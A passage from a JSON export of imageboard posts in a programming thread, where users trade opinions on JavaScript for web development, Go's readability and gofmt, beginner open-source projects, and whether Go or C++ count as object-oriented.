Node.js.","name":"Ishikura \"Tatsu\" Tatsuhiko","time":1605495054,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605495054},{"no":22262,"resto":6019,"com":"<a onclick=\"highlightReply('22261', event);\" href=\"\/\u03bb\/res\/6019.html#22261\">&gt;&gt;22261<\/a><br\/><span class=\"quote\">&gt;otherwise JS is pretty much mandatory for webdev<\/span><br\/>I guess I can avoid this cancer, then. Better learn some basics so that I have more options when looking for a job. Thanks.","name":"McCarthy","time":1605495772,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605495772},{"no":22265,"resto":6019,"com":"<a onclick=\"highlightReply('22262', event);\" href=\"\/\u03bb\/res\/6019.html#22262\">&gt;&gt;22262<\/a><br\/>Every day, I wake up and thank the universe that I don't have to do webdev for a living. If I had to write javascript on a daily basis, I think I'd jump off a bridge.","name":"limited","time":1605525992,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605525992},{"no":22274,"resto":6019,"com":"<a onclick=\"highlightReply('22184', event);\" href=\"\/\u03bb\/res\/6019.html#22184\">&gt;&gt;22184<\/a><br\/>That would be sweet, anon.","name":"Netrunner","time":1605552326,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605552326},{"no":22285,"resto":6019,"com":"any recommended projects a beginner can participate in that uses go?","name":"Undisclosed","time":1605580597,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605580597},{"no":22286,"resto":6019,"com":"<a onclick=\"highlightReply('22285', event);\" href=\"\/\u03bb\/res\/6019.html#22285\">&gt;&gt;22285<\/a><br\/>are you asking for open source projects to contribute to? there are lots of repos tagged with \"first-time-contributor\" \"help-wanted\" and similar tags, google around for \"github tags to get started in open source\" and then just filter by your preferred language","name":"Shogun","time":1605581442,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605581442},{"no":22304,"resto":6019,"com":"<a href=\"http:\/\/dtrace.org\/blogs\/wesolows\/2014\/12\/29\/golang-is-trash\/\" rel=\"nofollow\" target=\"_blank\">http:\/\/dtrace.org\/blogs\/wesolows\/2014\/12\/29\/golang-is-trash\/<\/a>","name":"Agent Jones","time":1605617895,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605617895},{"no":22305,"resto":6019,"com":"<a href=\"https:\/\/web.archive.org\/web\/20191205031849\/https:\/\/grimoire.ca\/dev\/go\" rel=\"nofollow\" target=\"_blank\">https:\/\/web.archive.org\/web\/20191205031849\/https:\/\/grimoire.ca\/dev\/go<\/a>","name":"Gyula Kovacs","time":1605619520,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605619520},{"no":22316,"resto":6019,"com":"<a onclick=\"highlightReply('22304', event);\" href=\"\/\u03bb\/res\/6019.html#22304\">&gt;&gt;22304<\/a><br\/><a onclick=\"highlightReply('22305', event);\" href=\"\/\u03bb\/res\/6019.html#22305\">&gt;&gt;22305<\/a><br\/>As the old saying goes, there's only two kinds of programming languages: ones that people hate, and dead ones.<br\/><br\/>I think the *real* anger towards Go from certain quarters is because it punishes job-security obfuscation coding practices. There's a lot of lazy, egotistical divas in a lot of software companies (*especially* where C++ is used) who've gotten very comfy with being unproductive yet unfireable, because they're the only ones who know how some arcane yet vital legacy code works. Their gravy train is directly threatened by any language that enforces readability and maintainability.","name":"Zero Cool","time":1605645751,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605645751},{"no":22325,"resto":6019,"com":"<a onclick=\"highlightReply('22316', event);\" href=\"\/\u03bb\/res\/6019.html#22316\">&gt;&gt;22316<\/a><br\/><span class=\"quote\">&gt;I think the *real* anger towards Go from certain quarters is because it punishes job-security obfuscation coding practices. There's a lot of lazy, egotistical divas in a lot of software companies (*especially* where C++ is used) who've gotten very comfy with being unproductive yet unfireable, because they're the only ones who know how some arcane yet vital legacy code works.<\/span><br\/>Most of criticism of Go I see comes from people of Java, Python crowd. C++ would be the 2nd group. ANSI C the third. At least in my observations. C crowd seems to have most technical arguments.<br\/><br\/>Funny is that first two groups of critics can't make their mind if Go is OO or not. One guy can prise supposed \"OO\" of Golang, another may write hysterical litany about lack of OO. \"No generics\" is another meh argument also coming from them. <br\/><span class=\"quote\"><br\/>&gt; Their gravy train is directly threatened by any language that enforces readability and maintainability.<\/span><br\/><br\/>C++ is a rococo disaster and with every version it only goes worse. I agree on that.<br\/><br\/> Yet nothing per se enforces maintainability and readability in Go. You can write hard to follow and read code in that language too.","name":"Haruyoshi","time":1605662981,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605662981},{"no":22327,"resto":6019,"com":"<a onclick=\"highlightReply('22325', event);\" href=\"\/\u03bb\/res\/6019.html#22325\">&gt;&gt;22325<\/a><br\/><span class=\"quote\">&gt;Funny is that first two groups of critics can't make their mind if Go is OO or not.<\/span><br\/>I always get a kick out of people like that. I think of it as being just OO enough to be useful, but not OO enough to be a C++ style clusterfuck of footgun class insanity.<br\/><span class=\"quote\"><br\/>&gt;Yet nothing per se enforces maintainability and readability in Go. You can write hard to follow and read code in that language too.<\/span><br\/>I'd actually disagree (mostly) with that. It's certainly possible to write confusing code in any language, but one really needs to work hard at it in Go. A prime example of confusion-reduction is how the gofmt tool enforces common styling, particularly in how it reformats source to follow the One True Brace Style. It's refreshing to look at someone else's code and not have to decipher what weird homegrown brace style they cooked up. More languages ought to have their own gofmt equivalent (LOOKING AT YOU, JAVASCRIPT).","name":"Nobody special","time":1605669381,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605669381},{"no":22328,"resto":6019,"com":"<a onclick=\"highlightReply('22327', event);\" href=\"\/\u03bb\/res\/6019.html#22327\">&gt;&gt;22327<\/a><br\/>Go is not OO at all.","email":"sage","name":"byte","time":1605670959,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605670959},{"no":22337,"resto":6019,"com":"<a onclick=\"highlightReply('22328', event);\" href=\"\/\u03bb\/res\/6019.html#22328\">&gt;&gt;22328<\/a><br\/>Neither is C++.","name":"Crash Override","time":1605690672,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605690672},{"no":22338,"resto":6019,"com":"<a onclick=\"highlightReply('22337', event);\" href=\"\/\u03bb\/res\/6019.html#22337\">&gt;&gt;22337<\/a><br\/>neither is SmallTalk","name":"Just another Random Lainon","time":1605692891,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605692891},{"no":22339,"resto":6019,"com":"Quiet based discussion on Golang on ycombinator<br\/><br\/><a href=\"https:\/\/news.ycombinator.com\/item?id=9711639\" rel=\"nofollow\" target=\"_blank\">https:\/\/news.ycombinator.com\/item?id=9711639<\/a>","name":"hash table","time":1605702419,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605702419}]}